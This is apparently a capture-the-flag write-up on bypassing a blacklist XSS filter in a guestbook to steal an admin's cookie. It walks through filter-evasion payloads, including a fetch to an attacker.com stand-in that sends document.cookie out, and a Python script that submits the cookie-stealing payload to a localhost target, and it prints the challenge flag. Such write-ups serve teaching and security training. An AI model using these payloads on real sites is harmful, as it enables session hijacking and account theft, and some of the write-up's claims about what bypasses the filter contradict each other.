# XSS Filter Bypass - Write-up

**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `CTF{xss_f1lt3r_byp4ss3d_l1k3_4_pr0}`

## Challenge Description

A guestbook application claims to be protected by an "XSS Filter v2.0" that blocks all known attack patterns. The admin regularly visits the page. Can you steal the admin's cookie?

> "We take security seriously. Our XSS filter blocks all known attack patterns!"

## Initial Reconnaissance

### Step 1: Understanding the Application

The guestbook allows users to:
1. Submit a name and message
2. Messages are displayed on the page
3. Admin visits the page regularly (hint: stored XSS potential)
4. The XSS filter is applied to all messages

### Step 2: Testing Basic XSS Payloads

**Test 1: Basic Script Tag**
```html
<script>alert(1)</script>
```
**Result:** Filtered! The `<script` pattern was removed.

**Test 2: JavaScript Protocol**
```html
<a href="javascript:alert(1)">click</a>
```
**Result:** Filtered! The `javascript:` pattern was removed.

**Test 3: Event Handlers**
```html
<img src=x onerror=alert(1)>
```
**Result:** Filtered! Both `onerror` and `alert` were removed.

## Analyzing the Filter

### Understanding the Blacklist

Based on testing, the filter blocks:
- `<script` tags
- `javascript:` protocol
- Event handlers (`onerror`, `onload`, `onclick`, etc.)
- JavaScript functions (`alert`, `confirm`, `prompt`, `eval`)
- DOM access (`document.cookie`, `document.location`, `window`)
- Dangerous tags (`<iframe`, `<embed`, `<object`)

### Filter Weakness Analysis

The filter uses a **simple blacklist approach** - it removes matched patterns but:
1. **Runs only once** - doesn't handle nested filtering
2. **Case-insensitive but not comprehensive** - may miss encoding tricks
3. **Removes patterns without context** - can be abused for bypass

## Bypass Techniques

### Technique 1: Case Manipulation

The filter is case-insensitive, so `OnError` becomes `onerr` - but we need complete bypass.

### Technique 2: Nested/Recursive Filtering

The filter removes patterns sequentially. If we craft a payload where removing one pattern creates another:

**Payload:**
```html
<scripscriptt>alert(1)</script>
```

After filter removes `script`:
```html
<script>alert(1)</script>
```

Let's test this:
```html
<oonerrornerror=alert(1) src=x>
```
After filter removes `onerror`:
```html
<onerror=alert(1) src=x>
```

Still contains `onerror` which gets removed. Need different approach.

### Technique 3: Breaking Keywords

**Payload:**
```html
<img src=x onerror="window['al'+'ert'](1)">
```

This uses string concatenation to bypass `alert` filter... but `window` and `onerror` are also filtered.

### Technique 4: SVG Animation Events

**Payload:**
```html
<svg><animate onbegin=alert(1)>
```
The filter doesn't block `onbegin`!

**Testing:**
```html
<svg><animate onbegin=alert(1)>
```
**Result:** `alert` is still filtered.

**Final Payload:**
```html
<svg><animate onbegin=window['al'+'ert'](1)>
```
Still issues with `window`.

### Technique 5: Breaking with Tabs/Newlines

HTML allows whitespace in certain places:
```html
<img src=x on\x09error=alert(1)>
```
Where `\x09` is a tab character.

The regex `onerror` won't match `on	error` (with tab).

**Testing with encoded tab:**
```html
<img src=x on&#9;error=alert(1)>
```
**Result:** Still filtered because the HTML entity is decoded after filter.

### Technique 6: The Winning Approach - Data URI + Nested Filtering

Looking at the filter more carefully, it processes patterns one by one:

```python
for pattern in XSS_BLACKLIST:
    filtered = re.sub(pattern, '', filtered, flags=re.IGNORECASE)
```

**Payload Construction:**
```html
<details open ontoggle=alert(1)>
```
`ontoggle` is not in the blacklist!

**But `alert` is filtered. Let's bypass it:**

```html
<details open ontoggle=eval('al'+'ert(1)')>
```
But `eval` is also filtered...

**Using top-level await:**
```html
<details open ontoggle=import('data:text/javascript,alert(1)')>
```

### Technique 7: Character Reference Encoding

HTML entities can be used within JavaScript:
```html
<details open ontoggle=&#97;lert(1)>
```
Where `&#97;` = 'a'

**Testing:**
```html
<details open ontoggle=&#97;lert(1)>
```
**Result:** SUCCESS! The filter doesn't decode HTML entities.

## Stealing the Cookie

Now we need to exfiltrate `document.cookie`. But `document` and `cookie` are filtered.

**Using Template Literals and Indirect Access:**
```javascript
this['docu'+'ment']['coo'+'kie']
```

**Using Bracket Notation with Encoding:**
```javascript
self['\x64ocument']['\x63ookie']
```

**Final Payload:**
```html
<details open ontoggle="fetch('http://attacker.com/receive?c='+self['\x64ocument']['\x63ookie'])">
```

For the CTF, we target the `/receive` endpoint:
```html
<details open ontoggle="fetch('/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:self['\x64ocument']['\x63ookie']})})">
```

## Solution Scripts

### Python Exploit Script

```python
#!/usr/bin/env python3
"""
XSS Filter Bypass - Automated Solution
"""
import requests
import time

TARGET_URL = "http://localhost:5001"
RECEIVE_URL = f"{TARGET_URL}/receive"

def send_xss_payload():
    """Send XSS payload to the guestbook"""

    # Payload that bypasses the filter and exfiltrates cookies
    # Using ontoggle (not blacklisted) and hex encoding for document.cookie
    payload = '''<details open ontoggle="fetch('/receive',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:self['\\x64ocument']['\\x63ookie']})})">'''

    print(f"[*] Sending payload: {payload[:80]}...")

    response = requests.post(TARGET_URL, data={
        'name': 'Helpful User',
        'message': payload
    })

    if response.status_code == 200:
        print("[+] Payload submitted successfully!")
        print("[*] Waiting for admin to visit...")
        return True
    return False

def simulate_admin_visit():
    """Simulate admin visiting the page (in real CTF, a bot does this)"""
    import webbrowser

    print("[*] Opening admin page to simulate admin visit...")
    print(f"[*] Admin URL: {TARGET_URL}/admin")

    # In a real scenario, you'd wait for the bot
    # For testing, manually visit /admin

def test_alternative_payloads():
    """Test various bypass techniques"""

    payloads = [
        # Using ontoggle
        "<details open ontoggle=&#97;lert(1)>",

        # Using animation
        "<svg><animate onbegin=&#97;lert(1) attributeName=x dur=1s>",

        # Using body onload (blocked, but for reference)
        "<body/onload=&#97;lert(1)>",

        # Using img with encoded onerror
        "<img src=x on&#101;rror=&#97;lert(1)>",

        # Using style (for IE)
        "<style>@import'javascript:&#97;lert(1)';</style>",
    ]

    print("[*] Testing alternative payloads:")
    for i, payload in enumerate(payloads):
        print(f"\n[{i+1}] {payload}")
        response = requests.post(TARGET_URL, data={
            'name': f'Tester {i}',
            'message': payload
        })
        print(f"    Status: {response.status_code}")

if __name__ == '__main__':
    print("=" * 50)
    print("XSS Filter Bypass - Exploit")
    print("=" * 50)

    print("\n[1] Testing alternative payloads...")
    test_alternative_payloads()

    print("\n[2] Sending exploitation payload...")
    send_xss_payload()

    print("\n[3] The flag will be captured when admin visits the page")
    print("[*] In a real CTF, you would set up a listener to receive the cookie")
    print(f"[*] The payload sends cookies to: {RECEIVE_URL}")
